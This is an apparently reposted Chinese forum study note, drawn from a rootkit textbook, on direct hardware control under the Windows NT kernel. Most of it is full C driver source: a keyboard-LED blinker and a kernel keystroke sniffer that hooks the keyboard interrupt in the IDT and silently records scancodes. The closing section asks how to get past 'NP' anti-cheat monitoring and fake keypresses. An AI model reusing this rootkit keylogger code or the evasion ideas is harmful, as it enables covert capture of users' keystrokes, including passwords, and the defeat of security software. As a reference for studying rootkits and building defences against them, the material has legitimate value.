
# NT 内核下直接硬件操控(RootKit)

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-356.htm`](https://www.pediy.com/kssd/pediy09/pediy09-356.htm)

> 此文内容大部分来自《Rootkits: Subverting the Windows Kernel》，由于本人水平有限，错误是难免的；而且我也有很多不懂的地方，期待各位高人能指点迷津。
>
> 修改 BIOS 和微芯片中的数据是很危险的，但效果往往也很明显。你必须非常小心地设计，这种类型的 RootKit 会非常难以检测。比如，修改以太网卡，这是一个很先进的思想，不过你必须熟悉硬件的许多技术细节。你可以通过逆向工程，公开的白皮书，或者内部资料来获取这类细节。
>
> 这类技术不一定用到 PC 上，我们的周围，有很多嵌入式设备，它们用来执行一些短小和单一的程序。 一个嵌入式设备由一些微芯片及控制程序组成，它负责处理 stepper motors，voltage regulation，armature movements, little blinking lights 等等。
>
> 硬件操控是一把双刃剑，一方面，它会使你的 RootKit 运行在很低的级别上，几乎没有什么可以限制你的东西，你可以直接访问外围设备，磁盘控制器，处理器，硬件的存贮器。另一方面，硬件的工作方式决定了它的平台相关性，使你的 RootKit 不具备可移植性。
>
> 处理器通过执行保存在微芯片内的代码启动和运行，比如，PC 机启动时，总是首先执行 BIOS，扫描并配置硬件。所有的硬件都有这个共性。这段启动代码称为“bootstrap code”，“bootstrap code”也叫做 firmware，它是非易失性的，就是说，当硬件断电时也不会被抹去。
>
> firmware 是关键，RootKit 可以通过为 firmware 打补丁实现我们想得到的新功能。但要注意，打补丁时不要覆盖其本来的代码，这类补丁一般都有严格的大小限制。
>
> 为 firmware 打补丁，就必须要写入存贮芯片（在 PC 上，一般是指写入 BIOS）。你可以用外部设备来做这件事，也可以用软件（加载程序）来实现。病毒或木马都可能这么做。
>
> 路由器和一些嵌入式设备的 firmware 不支持使用加载程序。这种情况下你可以试下 firmware 升级的方法.
>
> 软件的工作，除了简单的数学计算，再就是数据的移动。通过将特定的数据移动到硬件的存贮芯片，我们就可以对硬件进行控制。大部分硬件都有自己的存贮芯片，这些存贮芯片是可以被访问的。
>
> 大部分硬件都会露出自己的存贮芯片地址，这个地址叫做端口。读写端口需要特殊的指令，在 PC 机上，读写指令分别为 IN，OUT。不过在 PC 机下，很多硬件的存贮器地址会被映射到 PC 机内存上，这样你就可以直接用 MOV 指令来操作。
>
> 读写硬件的存贮器和读写 RAM 有很大区别，如果你向一个端口写数据，然后马上又把数据读取出来，前后的数据有可能不同。因为该端口内部其实有两个寄存器，分别对应着读取与写入操作。
>
> 续
>
> ## I/O 控制器
>
> CPU 和 RAM 之间共享一条总线(BUS)，外围设备和卡槽设备连接到另一条总线，总线之间的联系必须要通过 I/O 控制器。现代主板上的总线类型非常多，比如 PCI 总线 ， AGP 总线。总线是设备与设备之间，或者设备与 CPU 之间通信的桥梁。在总线上，有的设备只响应 CPU 发出的请求。有的则监视总线上所有的数据传输。数据传输通过设备自己的存贮器进行，设备通过检查自己的存贮器是否发生改变来获取请求。
>
> ## BIOS
>
> 主板 BIOS 一般只用来启动计算机，现代操作系统很少用到 BIOS 提供的功能。在完成检查和配置硬件后，BIOS 把控制转交给硬盘上的一个专门的用于启动的块，`MBR->引导扇区->NTLDR` 再由 NTLDR 加载 WINDOWS 核心。不过 BIOS 是可以被修改的，我已在前面提到过。著名的 CIH 病毒就是通过修改 BIOS 来破坏系统的。PCI 设备可以有自己的 BIOS。
>
> ## 控制键盘上的 LED 灯闪烁
>
> 控制芯片很简单，只要你知道它的存贮器地址就可以了。我们可以用 IN 和 OUT 指令来传输数据。8259 键盘控制器的端口地址为 `0x60` 和 `0x64`。`64` 端口用于传输数据，`60` 端口就稍微复杂点，如果对 `60` 端口进行读操作，那么读出的是状态字，写操作的话，写入的就是命令了。
>
> 下面我们用这种方法来控制键盘的 LED，使其不停闪烁。我会在代码内加很多注释帮助你了解整个过程，我不懂的地方就请高人解答了-\_-
>
> 代码如下：
>
> ```c
> PKTIMER gTimer;   //内核态下的定时器，功能和用户态下的定时器一样
> PKDPC gDPCP;      //DPC 对象，延迟过程调用，你可以暂且把它理解为回调函数
> UCHAR g_key_bits = 0;
> #define SET_LEDS 0xED  //命令字
> #define KEY_RESET 0xFF
> #define KEY_ACK 0xFA // ack
> #define KEY_AGAIN 0xFE // send again
> PUCHAR KEYBOARD_PORT_60 = (PUCHAR)0x60; //端口 0x60 和 0x64
> PUCHAR KEYBOARD_PORT_64 = (PUCHAR)0x64;
> #define IBUFFER_FULL 0x02  //status register bits
> #define OBUFFER_FULL 0x01  //这两个位我不太清楚是什么意义，下面会用到
> // flags for keyboard LEDS
> #define SCROLL_LOCK_BIT (0x01 << 0)//用于指示键盘的 LEB 闪烁，下面会提到
> #define NUMLOCK_BIT (0x01 << 1)
> #define CAPS_LOCK_BIT (0x01 << 2)
>
> /* 这个函数用于等待，等待可以对键盘端口进行读写操作？不太了解★*/
> ULONG WaitForKeyboard()
> {
>   char _t[255];
>   int i = 100; // number of times to loop
>   UCHAR mychar;
>   //DbgPrint("waiting for keyboard to become accessible\n");
>   do
>   {
>     mychar = READ_PORT_UCHAR( KEYBOARD_PORT_64 );//READ_PORT_UCHAR 是 HAL.DLL 提供的宏，相当于 in 指令，但可以
>                                                   //跨各种硬件平台
>     KeStallExecutionProcessor(50);
>     //_snprintf(_t, 253, "WaitForKeyboard::read byte %02X
>     // from port 0x64\n", mychar);
>     //DbgPrint(_t);
>     if(!(mychar & IBUFFER_FULL)) break; // if the flag is
>     // clear, we go ahead 看样子是等捕获的数据第 2 位为 0，这代表什么？
>   }
>   while (i--);
>   if(i) return TRUE;
>   return FALSE;
> }
>
> /*下面这个函数必须在调用 WaitForKeyboard()并且返回成功后才可调用，函数名的字面意思是清空输出存贮器
>   这样看来，调用 OUT 指令，在取出数据的同时，所取出的数据也会在存贮器内被删除，不知道理解的对不对★*/
> void DrainOutputBuffer()
> {
>   char _t[255];
>   int i = 100; // number of times to loop
>   UCHAR c;
>   //DbgPrint("draining keyboard buffer\n");
>   do
>   {
>     c = READ_PORT_UCHAR(KEYBOARD_PORT_64); //
>     KeStallExecutionProcessor(666);
>     //_snprintf(_t, 253, "DrainOutputBuffer::read byte
>     // %02X from port 0x64\n", c);
>     //DbgPrint(_t);
>     if(!(c & OBUFFER_FULL)) break; // If the flag is
>     // clear, we go ahead.
>     // Gobble up the byte in the output buffer.
>     c = READ_PORT_UCHAR(KEYBOARD_PORT_60);
>     //_snprintf(_t, 253, "DrainOutputBuffer::read byte
>     // %02X from port 0x60\n", c);
>     //DbgPrint(_t);
>   }
>   while (i--);
> }
>
> /*下面这个函数就好理解了，向 60 端口发送命令，*/
> ULONG SendKeyboardCommand( IN UCHAR theCommand )
> {
>   char _t[255];
>   if(TRUE == WaitForKeyboard()) //先调用 WaitForKeyboard()函数等待
>   {
>     DrainOutputBuffer(); //再清空输出存贮器？要这两步后才可以对 60 端口输入命令，这两步是什么意义？★
>     //_snprintf(_t, 253, "SendKeyboardCommand::sending byte
>     // %02X to port 0x60\n", theCommand);
>     //DbgPrint(_t);
>     WRITE_PORT_UCHAR( KEYBOARD_PORT_60, theCommand );
>     //DbgPrint("SendKeyboardCommand::sent\n");
>   }
>   else
>   {
>     //DbgPrint("SendKeyboardCommand::timeout waiting
>     for keyboard\n");
>       return FALSE;
>   }
>   // TODO: wait for ACK or RESEND from keyboard.
>   return TRUE;
> }
>
> /*下面这个为 SendKeyboardCommand()的外包函数，具体实现发送命令*/
> void SetLEDS( UCHAR theLEDS )
> {
>   // setup for setting LEDS
>   if(FALSE == SendKeyboardCommand( 0xED )) //
>   {
>     //DbgPrint("SetLEDS::error sending keyboard command\n");
>   }
>   // send the flags for the LEDS
>   if(FALSE == SendKeyboardCommand( theLEDS ))
>   {
>     //DbgPrint("SetLEDS::error sending keyboard command\n");
>   }
> }
>
> /*下面这个函数是卸载驱动，很简单，一看就明白
> VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
> {
>   DbgPrint("ROOTKIT: OnUnload called\n");
>   KeCancelTimer( gTimer ); //销毁创建的资源
>   ExFreePool( gTimer );
>   ExFreePool( gDPCP );
> }
>
> /*这是 DPC 的回调函数，你可以这么理解。它具体调用 SetLEDS()*/
> VOID timerDPC(IN PKDPC Dpc,
>   IN PVOID DeferredContext,
>   IN PVOID sys1,
>   IN PVOID sys2)
> {
>   //WRITE_PORT_UCHAR( KEYBOARD_PORT_64, 0xFE );
>   SetLEDS( g_key_bits++ );
>   if(g_key_bits > 0x07) g_key_bits = 0;  //g_key_bits 从 0x1 到 0x6 循环，键盘上的 3 个 LED 灯就会交错闪烁
> }
>
> /*驱动程序的入口函数，很容易理解*/
> NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING
>   theRegistryPath )
> {
>   LARGE_INTEGER timeout;
>   theDriverObject->DriverUnload = OnUnload;
>   // These objects must be non-paged.
>   gTimer = ExAllocatePool(NonPagedPool,sizeof(KTIMER));
>   gDPCP = ExAllocatePool(NonPagedPool,sizeof(KDPC));
>   timeout.QuadPart = -10;
>   KeInitializeTimer( gTimer );
>   KeInitializeDpc( gDPCP, timerDPC, NULL );
>   if(TRUE == KeSetTimerEx( gTimer, timeout, 1000, gDPCP))
>   {
>     DbgPrint("Timer was already queued..");
>   }
>   return STATUS_SUCCESS;
> }
> ```
>
> ## 键盘监视器
>
> 通过修改 IDT 中的 `0x31` 键盘中断处理程序来捕获键盘输入，但不同的系统也许这个中断会不同。如果你理解了第一个程序，这个程序就很好理解了（但我还有些糊涂，我不懂的地方用★标识了，期待高人释疑）。你可以检查可编程中断控制器 PIC (Programmable Interrupt Controller)中对应 IRQ 为 1 的中断，就是键盘中断。
>
> 中断必须迅速地被处理，正常的中断处理程序调用 DPC 来处理中断，但我们不需要这样，我们只要捕获击键并放入内存就可以了。
>
> 代码如下:
>
> ```c
> // Basic Keyboard Sniffer
>
> #include "ntddk.h"
> #include <stdio.h>
>
> #define MAX_IDT_ENTRIES 0xFF
>
> // interrupt
> #define MAKELONG(a, b) ((unsigned long) (((unsigned short) (a)) | ((unsigned long) ((unsigned short) (b))) << 16))
> //#define NT_INT_KEYBD        0xB3
> #define NT_INT_KEYBD        0x31
>
> // commands
> #define READ_CONTROLLER    0x20
> #define WRITE_CONTROLLER   0x60
> ```



```c
// command bytes  

#define SET_LEDS      0xED  

#define KEY_RESET      0xFF  

   

// responses from keyboard  

#define KEY_ACK        0xFA  // ack  

#define KEY_AGAIN      0xFE  // send again  

   

// 8042 ports  

// when you read from port 64, this is called STATUS_BYTE  

// when you write to port 64, this is called COMMAND_BYTE  

// read and write on port 64 is called DATA_BYTE  

PUCHAR KEYBOARD_PORT_60 = (PUCHAR)0x60;  

PUCHAR KEYBOARD_PORT_64 = (PUCHAR)0x64;  

   

// status register bits  

#define IBUFFER_FULL    0x02  

#define OBUFFER_FULL    0x01  

   

// flags for keyboard LEDs  

#define SCROLL_LOCK_BIT    (0x01 << 0)  

#define NUMLOCK_BIT      (0x01 << 1)  

#define CAPS_LOCK_BIT    (0x01 << 2)  

   

///////////////////////////////////  

// IDT structures  

///////////////////////////////////  

#pragma pack(1) //该声明使其内部的各个成员没有间隙  

   

// entry in the IDT, this is sometimes called  

// an "interrupt gate"  

typedef struct  

{  

  unsigned short LowOffset;  

  unsigned short selector;  

  unsigned char unused_lo;  

  unsigned char segment_type:4;  //0x0E is an interrupt gate  

  unsigned char system_segment_flag:1;  

  unsigned char DPL:2;  // descriptor privilege level  

  unsigned char P:1; /* present */  

  unsigned short HiOffset;  

} IDTENTRY;  

   

/* sidt returns idt in this format */  

typedef struct  

{  

  unsigned short IDTLimit;  

  unsigned short LowIDTbase;  

  unsigned short HiIDTbase;  

} IDTINFO;  

   

#pragma pack()  

   

unsigned long old_ISR_pointer;  // better save the old one!!  

unsigned char keystroke_buffer[1024]; //grab 1k keystrokes  

int kb_array_ptr=0;  

   

ULONG WaitForKeyboard()  

{  

  char _t[255];  

  int i = 100;  // number of times to loop  

  UCHAR mychar;  

   

  //DbgPrint("waiting for keyboard to become accecssable\n");  

  do  

  {  

    mychar = READ_PORT_UCHAR( KEYBOARD_PORT_64 );  

   

    KeStallExecutionProcessor(666);  

   

    //_snprintf(_t, 253, "WaitForKeyboard::read byte %02X from port 0x64\n", mychar);  

    //DbgPrint(_t);  

   

    if(!(mychar & IBUFFER_FULL)) break;  // if the flag is clear, we go ahead  

  }  

  while (i--);  

   

  if(i) return TRUE;  

  return FALSE;  

}  

   

// call WaitForKeyboard before calling this function  

void DrainOutputBuffer()  

{  

  char _t[255];  

  int i = 100;  // number of times to loop  

  UCHAR c;  

   

  //DbgPrint("draining keyboard buffer\n");  

  do  

  {  

    c = READ_PORT_UCHAR(KEYBOARD_PORT_64);  

    

    KeStallExecutionProcessor(666);  

   

    //_snprintf(_t, 253, "DrainOutputBuffer::read byte %02X from port 0x64\n", c);  

    //DbgPrint(_t);  

   

    if(!(c & OBUFFER_FULL)) break;  // if the flag is clear, we go ahead  

   

    // gobble up the byte in the output buffer  

    c = READ_PORT_UCHAR(KEYBOARD_PORT_60);  

    

    //_snprintf(_t, 253, "DrainOutputBuffer::read byte %02X from port 0x60\n", c);  

    //DbgPrint(_t);  

  }  

  while (i--);  

}  

   

// write a byte to the data port at 0x60  

ULONG SendKeyboardCommand( IN UCHAR theCommand )  

{  

  char _t[255];  

    

  if(TRUE == WaitForKeyboard())  

  {  

    DrainOutputBuffer();  

   

    //_snprintf(_t, 253, "SendKeyboardCommand::sending byte %02X to port 0x60\n", theCommand);  

    //DbgPrint(_t);  

   

    WRITE_PORT_UCHAR( KEYBOARD_PORT_60, theCommand );  

    

    //DbgPrint("SendKeyboardCommand::sent\n");  

  }  

  else  

  {  

    //DbgPrint("SendKeyboardCommand::timeout waiting for keyboard\n");  

    return FALSE;  

  }  

   

  // TODO: wait for ACK or RESEND from keyboard   

   

  return TRUE;  

}  

   

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )  

{  

  IDTINFO    idt_info;    // this structure is obtained by calling STORE IDT (sidt)  

  IDTENTRY*  idt_entries;  // and then this pointer is obtained from idt_info  

  char _t[255];  

   

  // load idt_info  

  __asm  sidt  idt_info   

  idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);  

        //将获取的 IDT 地址存入 idt_entries  

  DbgPrint("ROOTKIT: OnUnload called\n");  

   

  DbgPrint("UnHooking Interrupt...");  

   

  // restore the original interrupt handler  

  __asm cli   //屏蔽中断，并且恢复原始的键盘中断处理程序  

  idt_entries[NT_INT_KEYBD].LowOffset = (unsigned short) old_ISR_pointer;  

  idt_entries[NT_INT_KEYBD].HiOffset = (unsigned short)((unsigned long)old_ISR_pointer >> 16);  

  __asm sti   //恢复中断  

   

  DbgPrint("UnHooking Interrupt complete.");  

   

  DbgPrint("Keystroke Buffer is: ");  

  while(kb_array_ptr--)    //调试输出所截取的键盘按键  

  {  

    DbgPrint("%02X ", keystroke_buffer[kb_array_ptr]);  

  }  

}  

   

// using stdcall means that this function fixes the stack before returning (opposite of cdecl)  

void __stdcall print_keystroke()  

{  

  UCHAR c;  

  //DbgPrint("stroke");  

   

  // get the scancode  

  c = READ_PORT_UCHAR(KEYBOARD_PORT_60);     //读 0x60 端口获取扫描码  

  //DbgPrint("got scancode %02X", c);  

   

  if(kb_array_ptr<1024){                   //最多获取 1024 个扫描码  

    keystroke_buffer[kb_array_ptr++]=c;  

  }  

   

  //put scancode back (works on PS/2) 必须将刚获取的扫描码再写回去？★  

  WRITE_PORT_UCHAR(KEYBOARD_PORT_64, 0xD2); //command to echo back scancode   

  WaitForKeyboard();  

  WRITE_PORT_UCHAR(KEYBOARD_PORT_60, c); //write the scancode to echo back  

}  

   

// naked functions have no prolog/epilog code - they are functionally like the  

// target of a goto statement   我们自己的中断处理例程  

__declspec(naked) my_interrupt_hook()  

{  

  __asm  

  {  

    pushad          // save all general purpose registers  

    pushfd          // save the flags register  

    call  print_keystroke  // call function  

    popfd           // restore the flags  

    popad           // restore the general registers  

    jmp    old_ISR_pointer  // goto the original ISR  

  }  

}  

//DriverEntry()主要的工作是替换 IDT 中的键盘中断处理程序  

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )  

{  

  IDTINFO    idt_info;    // this structure is obtained by calling STORE IDT (sidt)  

  IDTENTRY*  idt_entries;  // and then this pointer is obtained from idt_info  

  IDTENTRY*  i;  

  unsigned long   addr;  

  unsigned long  count;  

  char _t[255];  

   

  theDriverObject->DriverUnload  = OnUnload;   

   

  // load idt_info  

  __asm  sidt  idt_info  

   

  idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);  

   

  for(count=0;count < MAX_IDT_ENTRIES;count++)  

  {  

    i = &idt_entries[count];  

    addr = MAKELONG(i->LowOffset, i->HiOffset);  

    

    _snprintf(_t, 253, "Interrupt %d: ISR 0x%08X", count, addr);  

    DbgPrint(_t);  

  }  

   

  DbgPrint("Hooking Interrupt...");  

  // lets hook an interrupt  

  // exercise - choose your own interrupt  

  old_ISR_pointer = MAKELONG(idt_entries[NT_INT_KEYBD].LowOffset,idt_entries[NT_INT_KEYBD].HiOffset);  

   

 // debug, use this if you want some additional info on what is going on  

#if 1  

  _snprintf(_t, 253, "old address for ISR is 0x%08x", old_ISR_pointer);  

  DbgPrint(_t);  

  _snprintf(_t, 253, "address of my function is 0x%08x", my_interrupt_hook);  

  DbgPrint(_t);  

#endif  
   
```



```
// remember we disable interrupts while we patch the table
__asm cli
idt_entries[NT_INT_KEYBD].LowOffset = (unsigned short)my_interrupt_hook;
idt_entries[NT_INT_KEYBD].HiOffset = (unsigned short)((unsigned long)my_interrupt_hook >> 16);
__asm sti

// debug - use this if you want to check what is now placed in the interrupt vector
#if 1
 i = &idt_entries[NT_INT_KEYBD];
 addr = MAKELONG(i->LowOffset, i->HiOffset);
 _snprintf(_t, 253, "Interrupt ISR 0x%08X", addr);
 DbgPrint(_t);   
#endif

 DbgPrint("Hooking Interrupt complete");

 return STATUS_SUCCESS;
}
```

### 微代码（Microcode）升级

现代 `Intel` 和 `AMD` 的处理器有一项特性是微代码（`Microcode`）升级，它允许你升级（上传）处理器内部的一小段代码，这段代码可以改变处理器的工作方式。就是说，处理器内部的的芯片是可以访问并修改的。这是很神秘的工作方式。直到我写这本书，这方面公开的文档也很少。

微代码（`Microcode`）升级之初的目的不是为了让你攻击的，它是为了提供错误检查定位的功能。如果处理器出现了故障，升级处理器内部的微代码可以确认问题来源。在处理器内部，微代码允许新的代码修改或添加。这可以改变处理器指令的工作，或者屏蔽处理器的一些特性。

`Linux` 下已经存在微代码升级的驱动，你可以用它来修改 `Intel` 或 `AMD` 处理器的微代码。你可以在互联网上搜索“`AMD K8 microcode update driver`”来找到它。

### 总结

自己水平非常有限，错误难免。而且我也有些不懂的地方，欢迎大家拍砖、指正。

在给出的代码中，我不懂的地方有三处，我都以“`★`”符号标明。

第一点，闪烁键盘 `LED` 灯的代码中，在向 `0x60` 端口发送命令前，必须要调用一个 `WaitForKeyboard()` 函数，该函数读取 `0x64` 数据端口并且检查读取数据的第二位是否为 `0`，必须要为 `0`，才可以继续下面的动作。那么 `0x64` 端口的第二位是什么标志？

第二点，在调用 `WaitForKeyboard()` 函数并且得到成功返回后，还要调用 `DrainOutputBuffer()` 函数，该函数仅仅是不停地读取 `0x64` 端口，直到读取的数据第一位为 `0`。按函数名的字面意思，是要将 `0x64` 端口内的数据全部读完？读取 `0x64` 端口获取的数据其第一位是什么标志？

最后，在键盘中断处理程序中，捕获 `0x60` 端口内的键盘扫描码后，又要将获取的扫描码返回去，这么做是否必须？

我期望了解这两个端口的详细操作，因为我需要模拟按键功能。如果谁能给我详细些的资料，不胜感激。

### 联想，疑惑

使用 `IN` 和 `OUT` 命令操作端口监听键盘动作似乎无法过 `NP`，那么 `NP` 肯定有更底层的机制来阻止监视，难道是修改键盘控制器的驱动？

键盘中断是怎么产生的？有没有可能人为产生一个键盘中断？键盘控制器和键盘中断处理例程之间还有什么？

`USB` 键盘是不是有完全不同的控制机制？我可以虚拟一个 `USB` 键盘来模拟按键吗？

期待高人的回复...

`4dd466d0e1e0cc123afbe504da2462ca`
